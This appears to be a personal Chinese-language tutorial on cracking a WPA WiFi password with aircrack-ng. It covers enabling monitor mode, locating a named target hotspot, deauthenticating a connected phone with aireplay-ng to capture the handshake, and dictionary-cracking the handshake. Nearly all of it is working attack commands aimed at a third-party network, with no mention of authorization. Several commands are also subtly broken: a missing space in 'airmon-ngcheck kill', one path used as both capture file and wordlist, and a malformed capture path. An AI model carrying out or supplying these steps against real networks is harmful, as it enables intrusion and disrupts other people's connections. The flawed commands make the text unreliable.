(bssid是wifi的关键，station是手机的mac地址)

1，插入无线网卡，选择连接到虚拟机→Debian 6 64位(可以在  虚拟机→可移动设备→Realtek RTL8187查看)

2，使用`ifconfig`查看无线网卡是否接入成功，成功会看到`wlan0`出现(没出现爷不要紧，跟着下面做)



3，==查看网卡是否支持监听模式==。在终端输入：`airmon-ng`，出现的内容列出了支持监听模式的无线网卡，可以看到wlan0支持监听模式


4，在终端输入：`airmon-ng start wlan0`,执行成功后网卡接口变成wlan0mon;可以使用ifconfig命令查看(==开启监听模式==)

5，`airmon-ngcheck kill` 杀死一切干扰无线网卡监听热点的信号（不行也没问题）


6,==开启监听==`airodump-ng wlan0mon`

7，当搜索到目标热点时 `ctrl+c` 停止。记下目标热点的`Bssid`：`E4:46:DA:06:C3:F2`和信道`CH`:13，目标名mix2

8,开始抓取握手包`airodump-ng -c 13 --bssid E4:46:DA:06:C3:F2 -w /root/root/1.txt wlan0mon`

-c指定信道

--bssid指定路由器bssid 

-w指定抓取的数据包保存的目录位置

---


9，另开一个终端开始给连接到目标热点的设备发死亡包
`aireplay-ng -0 2 -a E4:46:DA:06:C3:F2 -c 9C:2E:A1:00:11:42 wlan0mon`
-0表示发起几次攻击，0表示无限

-a指定无线路由器BSSID

-c指定强制断开的设备mac地址

---


10,如果成功抓取到了握手包的话原终端时间后面会有一个`[WPA handshake:E4:46:DA:06:C3:F2]`，这时候安Ctrl+C结束抓包

11，结束无线网卡的监控模式`airmon-ng stop wlan0mon`

12,开始破解密码`aircrack-ng -a2 -b E4:46:DA:06:C3:F2 -w /root/root/1.txt ~/-01.cap`

-a2代表WPA的握手包

-b指定要破解的wifi BSSID。

-w指定字典文件

-最后是抓取的包。